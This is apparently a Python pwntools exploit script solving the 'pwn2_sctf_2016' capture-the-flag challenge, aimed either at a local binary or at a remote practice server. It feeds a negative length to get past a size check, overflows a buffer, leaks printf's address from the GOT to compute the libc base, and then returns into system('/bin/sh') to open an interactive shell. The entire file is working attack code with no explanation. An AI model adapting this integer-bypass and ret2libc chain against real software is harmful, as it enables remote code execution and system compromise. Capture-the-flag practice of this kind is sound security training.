from pwn import *
import string
context.binary = './pwn2_sctf_2016'
context.log_level = 'debug'
context.timeout = None
elf = context.binary


if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20087)
	libc = ELF('../x86_libc.so.6')
else:
	libc = context.binary.libc
	p = process('./pwn2_sctf_2016')
	#gdb.attach(p, 'b* 0x080485B0')

def dbg():
	raw_input()


def send_magic(payload):
	p.recvuntil('read? ')
	p.sendline("-1")
	p.recvuntil('data!\n')
	p.sendline(payload)

atoi_plt = elf.plt['atoi']
getchar_plt = elf.plt['getchar']
printf_plt = elf.plt['printf']
"""
magic_addr = 0x804873c

int_80 = 0x080484D0
inc_eax = 0x080484D3
inc_ebx = 0x080484D5
inc_ecx = 0x080484D7
inc_edx = 0x080484D9
inc_esi = 0x080484DB
inc_edi = 0x080484DD

pop_ebx_ret = 0x0804835d
pop_edi_esi_ret = 0x0804864d 		# pop esi ; pop edi ; pop ebp ; ret
"""
main = 0x080485B8

payload = 'a'*0x30
payload += p32(printf_plt)
payload += p32(main)
payload += p32(elf.got['printf'])
send_magic(payload)
p.recvline()

printf_addr = u32(p.recvuntil('\xf7')[-4:])
libc_base = printf_addr - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search('/bin/sh\x00'))


payload = 'a'*0x30
payload += p32(system_addr)
payload += p32(main)
payload += p32(binsh)
send_magic(payload)

p.interactive()
p.close()